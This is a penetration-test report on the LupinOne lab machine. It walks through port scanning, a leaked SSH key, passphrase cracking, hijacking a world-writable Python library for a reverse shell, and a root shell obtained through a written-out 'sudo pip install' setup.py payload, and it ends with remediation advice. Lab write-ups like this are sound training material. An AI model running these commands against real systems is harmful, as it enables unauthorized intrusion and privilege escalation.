# Empire: LupinOne — Penetration Testing & Vulnerability Assessment Report

**Target System:** Empire – LupinOne (192.168.0.105)
**Assessment Type:** Internal Network Pentest / Black-Box
**Status:** Compromised (Root Access Achieved)

---

## Executive Summary

This black-box internal penetration test against the Empire: LupinOne server (192.168.0.105) ended in full `root` compromise.

The attack chain ran through four stages: information disclosure on the web server exposed a private SSH key; offline password cracking recovered its passphrase; a misconfigured `sudo` policy plus a world-writable Python library enabled lateral movement; and an insecure `pip` execution policy delivered privilege escalation to root.

**Overall Risk Rating: CRITICAL** — an unauthenticated attacker can gain total control of the server, compromising the confidentiality, integrity, and availability of all data on it.

## Methodology

The assessment followed a standard four-phase pentest methodology:

1. **Reconnaissance & Enumeration** — service mapping and web directory brute-forcing.
2. **Vulnerability Analysis** — identifying misconfigurations and leaked sensitive data.
3. **Exploitation** — gaining initial access via recovered credentials.
4. **Post-Exploitation & Privilege Escalation** — enumerating internal configurations to move laterally to a second user, then vertically to root.

## Reconnaissance & Service Enumeration

![Reconnaissance environment setup](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261015233145.png)

A full TCP port scan with Nmap identified two services: SSH (22) and HTTP (80).

```bash
nmap -sV -sC -p- 192.168.0.105
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry
|_/~myfiles
|_http-server-header: Apache/2.4.48 (Debian)
```

A follow-up Nmap vulnerability scan (`--script vuln`) flagged the OpenSSH 8.4p1 build against known CVEs via vulners, and confirmed no DOM-based, stored, or CSRF issues on the web app.

Nikto added further detail: Apache 2.4.48 is outdated, directory indexing is enabled under `/image/` and `/manual/images/`, and standard security headers (including `content-security-policy`) are missing.

```bash
nikto -h http://192.168.0.105
```
```
+ Server: Apache/2.4.48 (Debian)
+ [600050] Apache/2.4.48 appears to be outdated (current is at least 2.4.66).
+ [013587] /: Suggested security header missing: content-security-policy.
+ [002114] /manual/: Web server manual found.
+ [750500] /manual/images/: Directory indexing found.
+ [750500] /image/: Directory indexing found.
```

## Vulnerability Discovery & Initial Access

The `/robots.txt` disallow entry pointed to a hidden path, `~myfiles`, which served a custom 404 page.

![Web directory discovery](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261016000336.png)

Viewing the page source revealed a hidden comment containing what looked like a Base58-encoded string.

![Hidden source code comment](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261016000617.png)

Decoding it in CyberChef resolved to a secret path.

![Base58 decoding via CyberChef](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261016001803.png)

That path exposed a private SSH key (`id_rsa`) — a critical information-disclosure finding.

![SSH private key leak](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261016001829.png)

The key was passphrase-protected. Converting it for John the Ripper and running it against the `fasttrack.txt` wordlist recovered the passphrase in under two seconds:

```bash
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/fasttrack.txt hash.txt
```
```
P@55w0rd!        (id_rsa)
1g 0:00:00:01 DONE (2026-10-15 14:22) 0.5102g/s 65.30p/s
```

The recovered passphrase authenticated the key over SSH as user `icex64` (legacy KEX/host-key algorithms were explicitly permitted client-side to match the server's configuration):

```bash
ssh -o KexAlgorithms=+diffie-hellman-group14-sha256 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -i id_rsa icex64@192.168.0.105
```

![Successful SSH authentication](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261016170703.png)

![Netcat listener setup](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261016170855.png)

## Lateral Movement — icex64 to arsene

`sudo -l` showed that `icex64` could run a specific script as `arsene` without a password:

```
User icex64 may run the following commands on LupinOne:
    (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
```

`heist.py` imported the standard `webbrowser` library:

```python
import webbrowser
print ("Its not yet ready to get in action")
webbrowser.open("https://empirecybersecurity.co.mz")
```

Checking the library file revealed a critical permissions flaw — it was world-writable:

```
-rwxrwxrwx 1 root root 24087 Oct 16 07:17 /usr/lib/python3.9/webbrowser.py
```

![Python library hijacking setup](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261016180958.png)

A Python reverse-shell payload was injected into `webbrowser.py`. Running `heist.py` via `sudo` then executed the modified module instead of the real library, returning a shell as `arsene`.

![Reverse shell payload execution](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261016181044.png)

![Shell caught as arsene](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261016181107.png)

## Privilege Escalation to Root — arsene to root

A second `sudo -l` check as `arsene` showed unrestricted, passwordless `sudo pip` access — a well-documented GTFOBins privilege-escalation vector.

![Sudo pip escalation enumeration](https://github.com/MR-R00TX/Advanced-Penetration-Testing/raw/main/assets/Pasted%20image%2020261016181139.png)

A malicious Python package with an OS-command payload in `setup.py`, installed via `sudo pip`, delivered an interactive root shell:

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```

**Impact:** total compromise of the LupinOne server with `root` privileges.

## Remediation Recommendations

1. **Remove sensitive data from web roots.** Private keys, configuration files, and developer comments should never sit in public-facing web directories.
2. **Enforce strong passphrases.** The SSH key's passphrase (`P@55w0rd!`) was cracked in under two seconds against a small dictionary; require real complexity.
3. **Audit file permissions (least privilege).** Core system files and libraries — e.g. `/usr/lib/python3.9/webbrowser.py` — must be root-owned and never world-writable (`777`).
4. **Restrict sudo privileges.** Remove `NOPASSWD` execution of other users' scripts where not strictly necessary, and never grant `NOPASSWD` sudo rights to package managers (`pip`, `apt`, `dpkg`) or interpreters (`python`, `bash`), since all can execute arbitrary code.

---
*End of Report*
